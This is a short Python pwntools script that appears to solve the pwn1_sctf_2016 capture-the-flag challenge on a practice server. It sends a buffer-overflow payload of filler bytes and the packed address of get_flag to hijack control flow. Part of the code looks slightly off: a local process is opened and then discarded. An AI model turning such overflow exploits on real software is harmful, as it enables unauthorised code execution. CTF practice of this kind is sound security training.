from pwn import *


def pwn1_sctf_2016(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/pwn1_sctf_2016'):
    target = process([file_name])
    target = remote('node5.buuoj.cn', 28057)
    target_elf = ELF(file_name)

    get_flag_addr = p64(target_elf.symbols['get_flag'])

    payload = b'I' * 19 + b'A' * 7
    payload += get_flag_addr

    target.sendline(payload)

    print(target.recv())
    print(target.recv())


if __name__ == '__main__':
    pwn1_sctf_2016()
